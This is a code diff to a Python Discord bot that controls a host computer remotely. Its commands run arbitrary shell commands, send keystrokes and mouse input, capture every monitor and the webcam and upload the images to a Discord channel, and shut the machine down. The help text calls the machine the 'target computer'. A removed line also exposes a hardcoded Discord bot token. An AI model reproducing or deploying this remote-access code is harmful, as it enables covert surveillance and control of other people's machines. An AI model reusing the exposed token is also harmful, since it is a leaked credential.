@@ -800,11 +800,15 @@ class Helper:
     cv2.imwrite(pic_name, image)
     return pic_name
 
-  def grabScreenshot():
+  def getDisplayCount():
     with mss.mss() as sct:
-      monitor_count = len(sct.monitors)   
-      for i in range(monitor_count):
-        mss.mss().shot(mon=i)
+      monitor_count = len(sct.monitors)
+      return monitor_count
+
+  def grabScreenshot():
+    monitor_count = Helper.getDisplayCount()
+    for i in range(monitor_count):
+      mss.mss().shot(mon=i)
 
   def getTime():
     time = os.popen('time /t').read()
@@ -821,7 +825,7 @@ class Helper:
 
 
 # ---- Bot code starts here ----
-token = 'MTEzODU0OTQwMzc4Nzk5MzEwOA.GEHEUY.cWnzmienEleQGFSwbM8_YifB1emnsppF293o68'  # DONT COMMIT THIS PLEASE!
+token = open('token.key', 'r').read().replace('\n', '')  # Now u cant fuck this up
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents)
 
@@ -834,27 +838,32 @@ async def on_ready():
   print('Status: READY...\n')
 
   helpMsg = '''
-|------------------------------------------------------------------------|
-|       Command                     Description                    Args  |
-|------------------------------------------------------------------------|
-| !ping               |  Returns the bot's current ping in MS    |  N/A  |
-|------------------------------------------------------------------------|
-| !send-input         |  Sends an input to the keyboard          |  key  |
-|------------------------------------------------------------------------|
-| !heartbeat          |  Checks if the host is still on          |  N/A  |
-|------------------------------------------------------------------------|
-| !pass-command       |  Passes a command to the system          |  cmd  |
-|------------------------------------------------------------------------|
-| !send-input-string  |  Sends a string of keyboard inputs       |  str  |
-|------------------------------------------------------------------------|
-| !shutdown           |  Shuts down host computer                |  N/A  |
-|------------------------------------------------------------------------|
-| !uptime             |  Returns host computer's uptime          |  N/A  |
-|------------------------------------------------------------------------|
-| !screenshot         |  Reply's with a screen shot of displays  |  N/A  |
-|------------------------------------------------------------------------|
-| !webcam-shot        |  Reply's with a shot of the webcam       |  N/A  |
-|------------------------------------------------------------------------|
+    Command                      Description                     Args   
+|----------------------------------------------------------------------|
+| !ping          |  Returns the bot's current ping in MS       |  N/A  |
+|----------------------------------------------------------------------|
+| !send-input    |  Presses then releases any keyboard key     |  key  |
+|----------------------------------------------------------------------|
+| !press-mouse   |  Presses then releases any mouse button     |  key  |
+|----------------------------------------------------------------------|
+| !command       |  Passes a command to the system             |  cmd  |
+|----------------------------------------------------------------------|
+| !send-string   |  Sends a string of keyboard inputs          |  str  |
+|----------------------------------------------------------------------|
+| !scroll-mouse  |  Scroll mouse by args direction and amount  |  <2>  |
+|----------------------------------------------------------------------|
+| !find-mouse    |  Reply's with mouse's current location      |  X,Y  |
+|----------------------------------------------------------------------|
+| !move-mouse    |  Move mouse to given X & Y coordinates      |  N/A  |
+|----------------------------------------------------------------------|
+| !shutdown      |  Shuts down host computer                   |  N/A  |
+|----------------------------------------------------------------------|
+| !uptime        |  Returns host computer's uptime             |  N/A  |
+|----------------------------------------------------------------------|
+| !screenshot    |  Reply's with a screen shot of displays     |  N/A  |
+|----------------------------------------------------------------------|
+| !webcam-shot   |  Reply's with a shot of the webcam          |  N/A  |
+|----------------------------------------------------------------------|
   '''
 
   target_channel = bot.get_channel(1137852190933913741)
@@ -873,16 +882,29 @@ async def ping(ctx):
 
 @bot.command(name='send-input', description='Sends an input to the computer')
 async def sendInput(ctx, key):
-  Keyboard.pressAndReleaseKey(key)
-  await ctx.reply(f'Pressed key: "{key}"')
+  returnValue = Keyboard.pressAndReleaseKey(key)
+  if returnValue == 'null':
+    await ctx.reply(
+      'ERROR: Keyboard.pressAndReleaseKey() returned "null" meaning an error occurred during execution.'
+    )
+    return None
+  else:
+    await ctx.reply(f'Pressed key: "{key}"')
 
 
-@bot.command(name='heartbeat', description='Check if PC is still on')
-async def heartbeat(ctx):
-  await ctx.reply(f'Response: {Helper.getTime()}')
+@bot.command(name='press-mouse', description='Sends an input to the computer\'s mouse')
+async def sendMouseInput(ctx, key):
+  returnValue = Keyboard.pressAndReleaseMouse(key)
+  if returnValue == 'null':
+    await ctx.reply(
+      'ERROR: Keyboard.pressAndReleaseMouse() returned "null" meaning an error occurred during execution.'
+    )
+    return None
+  else:
+    await ctx.reply(f'Pressed key: "{key}"')
 
 
-@bot.command(name='pass-command', description='Pass a command to PC')
+@bot.command(name='command', description='Pass a command to PC')
 async def passcmd(ctx, cmd):
   out = os.popen(cmd).read()
   if out != '':
@@ -905,19 +927,53 @@ async def sendString(ctx, *string):
       )
       return None
   
-  ctx.reply(f'String: "{" ".join(string)}" sent to target computer\'s keyboard.')
+  await ctx.reply(f'String: "{" ".join(string)}" sent to target computer\'s keyboard.')
   time.sleep(1)
   Helper.grabScreenshot()
-  screen1 = 'monitor-1.png'
-  screen2 = 'monitor-2.png'
+  for i in range(Helper.getDisplayCount()):
+    screen = f'monitor-{i + 1}.png'
 
-  with open(screen1, 'rb') as f1:
-    picture1 = discord.File(f1)
-  with open(screen2, 'rb') as f2:
-    picture2 = discord.File(f2)
+    if os.path.exists(screen):
+      with open(screen, 'rb') as f:
+        picture = discord.File(f)
 
-  await ctx.reply('Monitor 1', file=picture1)
-  await ctx.reply('Monitor 2', file=picture2)
+      await ctx.reply(f'Monitor {i + 1}', file=picture)
+
+
+@bot.command(name='scroll-mouse', description='Scrolls mouse and reply\'s with screenshot')
+async def scroll(ctx, direction, amount):
+  returnValue = Keyboard.scrollMouse(direction, amount)
+
+  if returnValue == 'null':
+    await ctx.reply(
+      'ERROR: Keyboard.scrollMouse() returned "null" meaning an error occurred during execution.'
+    )
+    return None
+  
+  await ctx.reply(f'Scroll: ({direction, amount}) has been sent to the mouse.')
+  time.sleep(1)
+  Helper.grabScreenshot()
+  for i in range(Helper.getDisplayCount()):
+    screen = f'monitor-{i + 1}.png'
+
+    if os.path.exists(screen):
+      with open(screen, 'rb') as f:
+        picture = discord.File(f)
+
+      await ctx.reply(f'Monitor {i + 1}', file=picture)
+
+
+@bot.command(name='find-mouse', description='Reply\'s with mouse\'s current location')
+async def getMouseLocation(ctx):
+  position = Keyboard.ManipulateMouse.getPosition()
+  await ctx.reply(f'The mouse is currently at: {position}')
+
+
+@bot.command(name='move-mouse', description='Moves mouse to given X and Y')
+async def moveMouseLocation(ctx, x, y):
+  prev_position = Keyboard.ManipulateMouse.getPosition()
+  Keyboard.ManipulateMouse.setPosition(x, y)
+  await ctx.reply(f'The mouse was moved from: {prev_position} and is currently at: ({x}, {y})')
 
 
 @bot.command(name='shutdown', description='Shuts down PC')
@@ -936,16 +992,14 @@ async def uptime(ctx):
 @bot.command(name='screenshot', description='Get a screenshot from the computer')
 async def screenshot(ctx):
   Helper.grabScreenshot()
-  screen1 = 'monitor-1.png'
-  screen2 = 'monitor-2.png'
+  for i in range(Helper.getDisplayCount()):
+    screen = f'monitor-{i + 1}.png'
 
-  with open(screen1, 'rb') as f1:
-    picture1 = discord.File(f1)
-  with open(screen2, 'rb') as f2:
-    picture2 = discord.File(f2)
+    if os.path.exists(screen):
+      with open(screen, 'rb') as f:
+        picture = discord.File(f)
 
-  await ctx.reply('Monitor 1', file=picture1)
-  await ctx.reply('Monitor 2', file=picture2)
+      await ctx.reply(f'Monitor {i + 1}', file=picture)
 
 
 @bot.command(name='webcam-shot', description='Grab a shot from the webcam')
